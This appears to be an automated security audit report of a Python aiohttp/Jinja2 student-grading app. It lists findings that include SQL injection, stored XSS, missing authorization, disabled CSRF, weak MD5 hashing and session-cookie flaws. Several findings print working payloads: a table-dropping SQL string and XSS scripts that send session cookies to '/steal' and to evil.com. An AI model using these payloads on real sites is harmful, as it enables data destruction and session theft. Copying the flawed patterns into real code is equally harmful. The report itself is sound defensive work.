extra.message: SQL Injection in Student.create() via string interpolation of user-supplied name

metadata.proof: SOURCE: views.py:53 reads `data['name']` from the unauthenticated POST body at /students/. SINK: student.py:43 interpolates that value directly into the SQL string with Python's `%` operator instead of using parameterized bindings. An attacker can submit a name like `'); DROP TABLE students; --` to execute arbitrary SQL. All other DAO methods (course.py, mark.py, review.py, user.py) use proper `%(key)s` parameterization with `cur.execute(q, params)`, but this one method uses inline `%` formatting which defeats all database escaping.

extra.message: Missing Authorization on evaluate endpoint — any unauthenticated user can assign grades

metadata.proof: SOURCE: The `evaluate()` view at line 127 has NO `@authorize()` decorator (compare with `logout()` at line 156 which does). SINK: line 147 calls `Mark.create(conn, student_id, course_id, data['points'])` which writes grade data into the database for any student/course ID. There is no session check, no role check, and no CSRF token validation (middleware is commented out at app.py:27). An attacker can POST to /students/{student_id}/evaluate/{course_id} with arbitrary points values and manipulate grade records at will.

extra.message: Stored Cross-Site Scripting via student name rendered without escaping in students list

metadata.proof: SOURCE: views.py:53 reads `data['name']` from POST body (no auth required), then student.py:41-43 stores it in the database. SINK: students.jinja2:16 renders `{{ name }}` with no `|e` escape filter. Global autoescape=False (app.py:35) means Jinja2 does not escape HTML. An attacker submits `<script>fetch('/steal?c='+document.cookie)</script>` as the student name. When any user visits /students/, the script executes. Amplified by middlewares.py:20 where `httponly=False` allows JavaScript to read the session cookie.

extra.message: Stored Cross-Site Scripting via course title rendered without escaping in courses listing

metadata.proof: SOURCE: views.py:80-82 reads `data['title']` and `data['description']` from POST body (no auth required), then course.py:43-45 stores them. SINK: courses.jinja2:17 renders `{{ course.title }}` with no `|e` filter. Global autoescape=False (app.py:35). An attacker creates a course with title `` and it executes when any user browses /courses/. The courses.jinja2 listing view uses a simple `{% for course in courses %}` loop with no sanitization.

extra.message: Stored Cross-Site Scripting via course review text rendered without escaping

metadata.proof: SOURCE: views.py:116 reads `data.get('review_text')` from POST body at /courses/{course_id}/review (no auth required), then review.py:23-26 stores it. SINK: course.jinja2:22 renders `{{ review.review_text }}` with no `|e` filter. Global autoescape=False (app.py:35). An attacker submits review text containing `<script>document.location='https://evil.com/?c='+document.cookie</script>`. Every user visiting the course detail page triggers the payload. Session cookies lack HttpOnly (middlewares.py:20), enabling direct cookie theft.

extra.message: Weak password hashing using unsalted MD5

metadata.proof: SINK: user.py:42 uses `hashlib.md5` (a single round of unsalted MD5) to hash passwords for comparison. The fixtures at migrations/001-fixtures.sql use `md5('superadmin')`, `md5('password')`, etc. MD5 can be cracked at billions of hashes per second on consumer hardware. An attacker who extracts the password hashes (via the SQL injection in student.py:43, or a DB dump) can reverse them trivially and authenticate as any user including the admin.

extra.message: Session cookie lacks HttpOnly flag, enabling JavaScript cookie theft via XSS

metadata.proof: SINK: middlewares.py:20 creates a RedisStorage session backend with `httponly=False`. This instructs the browser to allow JavaScript access to the AIOHTTP_SESSION cookie. Combined with any of the stored XSS vulnerabilities (students.jinja2:16, courses.jinja2:17, course.jinja2:22), an attacker can execute `document.cookie` to steal the session identifier, then impersonate the victim. No additional flags (Secure, SameSite) are set either.

extra.message: CSRF middleware commented out — no server-side CSRF token validation on any POST endpoint

metadata.proof: SOURCE: app.py:27 has `csrf_middleware` commented out of the middleware list. The csrf_processor in jinja2.py:8-13 still generates and stores CSRF tokens in the session, and templates render `{{ csrf_token() }}` in hidden fields, but there is NO middleware validating the submitted token against the session. Every POST handler (login, student creation, course creation, review, evaluation) is vulnerable to Cross-Site Request Forgery. An attacker can craft an HTML form on any external site that auto-submits to POST endpoints, and the victim's browser will execute it if they are authenticated.

extra.message: Information disclosure via error.__dict__ dump in 500 error template

metadata.proof: SINK: errors/50x.jinja2:6 renders the full Python `__dict__` of any unhandled exception into the HTML page. When a 500 error occurs (triggerable via the `course.name` bug at course.jinja2:3, the `{{ error }}` typo at review.jinja2:26, or any unhandled database exception from the SQL injection at student.py:43), the complete exception object is exposed, including file paths, query strings, stack traces, and framework internals.

extra.message: Undefined template attribute course.name causes 500 error with information disclosure

metadata.proof: SOURCE: course.jinja2:3 references `course.name` but the `Course` NamedTuple (course.py:6-8) only defines `id`, `title`, and `description` — it has no `name` field. Jinja2 raises an `UndefinedError` every time this template is rendered (GET /courses/{id}). SINK: This 500 error propagates through the error_middleware (middlewares.py:44-46) which renders errors/50x.jinja2:6, dumping `{{ error.__dict__ }}`. Any visitor to a course detail page inadvertently triggers full internal state disclosure.

extra.message: Undefined template variable {{ error }} causes 500 error with information disclosure

metadata.proof: SOURCE: review.jinja2:26 renders `{{ error }}` but the Jinja2 loop on line 25 unpacks `errors.items()` into `fieldname, errors` — the singular `error` variable is never defined. When form validation fails (e.g., empty review_text on POST to /courses/{course_id}/review), the template crashes with UndefinedError. SINK: crashes propagate to errors/50x.jinja2:6 which dumps `{{ error.__dict__ }}`, leaking internal application state.

extra.message: Debug mode enabled in production application

extra.message: Jinja2 autoescaping globally disabled — root cause of all stored XSS

metadata.proof: setup_jinja() at app.py:33-35 with autoescape=False disables HTML autoescaping globally. Every {{ ... }} expression in every Jinja2 template is rendered without escaping. Without this, the individual XSS issues in course.jinja2:14, course.jinja2:15, course.jinja2:22, course.jinja2:49, student.jinja2:19, and evaluate.jinja2:25 would be mitigated by Jinja2's default autoescaping. extra.message: Session Fixation — session ID not rotated after successful login

metadata.proof: The session object is obtained via get_session(request) at line 29, which retrieves or creates a session identified by the AIOHTTP_SESSION cookie. At line 44, after a successful password check, the authenticated user.id is stored into this same session dict. The session ID cookie is never regenerated or rotated. The cookie is not HttpOnly (middlewares.py:17), so it is readable via XSS. An attacker can force a session ID onto a victim's browser (via XSS), wait for the victim to log in, then re-use the same session cookie to impersonate the authenticated victim.

extra.message: Missing Rate Limiting on Login Endpoint — unlimited brute-force of credentials

metadata.proof: The index view handles POST for login at line 35. There is no throttling, account lockout, CAPTCHA, or delay. An unauthenticated attacker can send unlimited POST / requests with different password guesses for any known username. The passwords in seed data (migrations/001-fixtures.sql:10-13) are trivially weak ('superadmin', 'password', 'spidey'), and password hashing uses unsalted MD5 (dao/user.py:44), making brute-force practical.

extra.message: DEBUG-Level Logging Enabled

metadata.proof: The root logger is set to DEBUG level at module load time (run.py:12) before the application starts. Combined with Application(debug=True) at app.py:20, both framework-level debug error pages and verbose logging are active simultaneously. extra.message: No Session Expiration TTL

metadata.proof: RedisStorage is instantiated without a `max_age` parameter, so the session cookie lacks an expiration (browser-session cookie only) AND the Redis key storing session data has no TTL. Combined with the logout function (views.py:167-170) only popping `user_id` from the session rather than clearing it entirely, stale session entries persist in Redis indefinitely. An attacker who captures a session cookie can replay it indefinitely, and Redis memory grows unboundedly.

extra.message: Session Cookie Missing Secure Flag

metadata.proof: The session middleware is instantiated via `session_middleware_(storage)` without `secure=True`. aiohttp-session defaults `secure=False`, so the `AIOHTTP_SESSION` cookie is transmitted over plain HTTP. The application binds to `0.0.0.0:8080` with no TLS (config/dev.yaml), so an active network attacker on an open Wi-Fi network can intercept the session cookie via passive sniffing and replay it to hijack sessions.

extra.message: Session Cookie Missing SameSite Attribute

metadata.proof: The session middleware factory is called without a `samesite` parameter. aiohttp-session defaults `samesite=None`, meaning the session cookie is attached to all cross-site requests. Combined with the disabled CSRF middleware (app.py:18, commented out), an attacker can mount CSRF attacks from a malicious third-party site — the victim's browser will automatically include the session cookie in forged requests.

extra.message: Timing-Based User Enumeration via Short-Circuit Password Check

metadata.proof: SOURCE: Attacker-controlled `username` and `password` from POST form data (lines 37-38). SINK: Line 41 uses short-circuit evaluation: if `user` is None (username not found via DB lookup at line 40), `check_password()` — which computes an MD5 hash and compares strings — is never called. If the username exists, the hash computation and string comparison execute, creating a measurable timing difference. Repeated requests allow an attacker to enumerate valid usernames by measuring response latency.

extra.message: Unbounded Student Query — No LIMIT clause

metadata.proof: SOURCE: Callers at views.py lines 59 and 105 invoke `Student.get_many(conn)` without a `limit` argument. SINK: The method default is `limit=None`, producing `SELECT id, name FROM students` with no LIMIT clause. `await cur.fetchall()` buffers ALL rows in server memory. An attacker can repeatedly call GET /students/ to force cumulative memory exhaustion on both the database and application server.
